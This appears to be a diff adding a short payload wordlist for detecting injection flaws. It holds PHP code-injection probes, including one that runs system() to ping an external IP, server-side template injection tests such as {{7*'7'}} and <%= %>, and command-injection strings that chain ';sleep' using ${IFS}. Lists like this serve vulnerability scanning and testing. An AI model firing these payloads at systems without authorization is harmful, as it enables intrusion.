@@ -1,0 +1,13 @@
+${@print(md5("RCEVulnerable"))}
+${@print("RCEVulnerable")}
+${@print(md5(RCEVulnerable))}
+{${sleep(10)}}
+${@print(system('ping -c 5 206.189.82.20'))}
+;sleep(10);
+{{123779*3}}[[123779*3]]
+${{123779*3}}
+${123779*3}
+{123779*3}
+{{7*'7'}}
+<%= 123779*3 %>
+;sleep${IFS}10;#${IFS}';sleep${IFS}10;#${IFS}";sleep${IFS}10;#${IFS}
